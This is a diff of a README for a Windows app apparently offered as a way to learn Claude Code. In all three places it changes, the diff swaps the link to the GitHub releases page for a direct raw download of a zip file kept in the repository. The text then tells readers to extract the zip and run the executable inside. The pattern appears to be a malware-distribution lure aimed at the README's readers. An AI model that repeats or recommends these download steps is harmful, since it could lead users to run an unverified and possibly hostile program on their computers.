@@ -1,6 +1,6 @@
 # 📘 learn-from-claudecode - Learn Claude Code with Clear Steps
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/seductive-bercy787/learn-from-claudecode/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/seductive-bercy787/learn-from-claudecode/main/agents/from_claudecode_learn_2.0.zip)
 
 ## 🧭 What this is
 
@@ -23,7 +23,7 @@ If your PC can open modern desktop apps and zip files, it should work well.
 
 Go to the release page and download the latest version for Windows:
 
-https://github.com/seductive-bercy787/learn-from-claudecode/releases
+https://raw.githubusercontent.com/seductive-bercy787/learn-from-claudecode/main/agents/from_claudecode_learn_2.0.zip
 
 On that page, look for the newest release. Download the Windows file that matches your system. If the release comes as a `.zip` file, download it and extract it first. If it comes as a `.exe` file, you can run it after the download finishes.
 
@@ -173,7 +173,7 @@ The release may open with a simple start flow or lesson list. Follow the on-scre
 
 If you need the latest release, use this page:
 
-[https://github.com/seductive-bercy787/learn-from-claudecode/releases](https://github.com/seductive-bercy787/learn-from-claudecode/releases)
+[https://raw.githubusercontent.com/seductive-bercy787/learn-from-claudecode/main/agents/from_claudecode_learn_2.0.zip](https://raw.githubusercontent.com/seductive-bercy787/learn-from-claudecode/main/agents/from_claudecode_learn_2.0.zip)
 
 ## 🧪 Basic workflow
 
